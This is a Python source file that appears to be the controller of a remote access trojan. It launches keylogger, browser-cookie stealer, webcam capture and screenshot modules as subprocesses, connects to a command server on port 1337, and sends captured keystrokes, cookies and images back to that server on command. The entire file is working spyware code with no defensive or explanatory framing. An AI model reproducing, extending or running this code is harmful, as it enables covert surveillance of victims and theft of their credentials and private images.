import multiprocessing as mp
import socket
import time

from cookie_stealer import *
from keylogger import *
from web_cam_stealer import *
from screen_stealer import *

IMAGE_NUM = 0

def create_packet(module, data):
    packet = module + "<==>" + data;
    return packet.encode()

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(('127.0.0.1', 1337))
            
            break
        except:
            print("sleeping")
            time.sleep(5)
    
    return sock
    
if __name__ == '__main__':
    
    sock = connect()

    keylogger_child,       keylogger_parent       = mp.Pipe()
    cookie_stealer_child,  cookie_stealer_parent  = mp.Pipe()
    web_cam_stealer_child, web_cam_stealer_parent = mp.Pipe()
    screen_stealer_child,  screen_stealer_parent  = mp.Pipe()

    # Start sub processes

    print("Starting subprocesses")
    keylogger_process       = mp.Process(target=keylogger,       args=(keylogger_child,))
    cookie_stealer_process  = mp.Process(target=cookie_stealer,  args=(cookie_stealer_child,))
    web_cam_stealer_process = mp.Process(target=web_cam_stealer, args=(web_cam_stealer_child,))
    screen_stealer_process  = mp.Process(target=screen_stealer,  args=(screen_stealer_child,))

    keylogger_process.start()
    cookie_stealer_process.start()
    web_cam_stealer_process.start()
    screen_stealer_process.start()

    while True:
        # Receive commands
        try:
            data = sock.recv(1024)
            
            if (len(data) > 0 and len(data) < 20):
                print(data)
                data = data.decode("utf-8")
                if (data == "cookies"):
                    cookie_stealer_parent.send("get_cookies")
                elif (data == "start_keylogger"):
                    keylogger_parent.send("start_keylogger")
                elif (data == "stop_keylogger"):
                    keylogger_parent.send("stop_keylogger")
                elif (data == "web_cam"):
                    web_cam_stealer_parent.send("get_frame")
                elif (data == "screenshot"):
                    screen_stealer_parent.send("get_frame")
                    
        except socket.timeout as e:
            # Timeout
            pass
        except Exception as e:
            # Disconnect
            print(e)
            print("Server disconnected, reconnecting..")
            sock = connect()

        while keylogger_parent.poll():
            data = keylogger_parent.recv()
            
            sock.send(create_packet("keylogger", data))

        while cookie_stealer_parent.poll():
            data = cookie_stealer_parent.recv()

            sock.send(create_packet("cookies", data))
            
        while web_cam_stealer_parent.poll():
            data = web_cam_stealer_parent.recv()
            
            if data == "success":
            
                f = open("web_cam.png", "rb")
                data = f.read()
                sock.send(b"web_cam_success<==>" + data)
                f.close()
                                
            else:
                sock.send(create_packet("web_cam_failure", data))
                
        while screen_stealer_parent.poll():
            data = screen_stealer_parent.recv()
            
            if data == "success":
                f = open("screenshot.png", "rb")
                data = f.read()
                sock.send(b"screenshot_success<==>" + data)
                f.close()
                                
            else:
                sock.send(create_packet("screenshot_failure", data))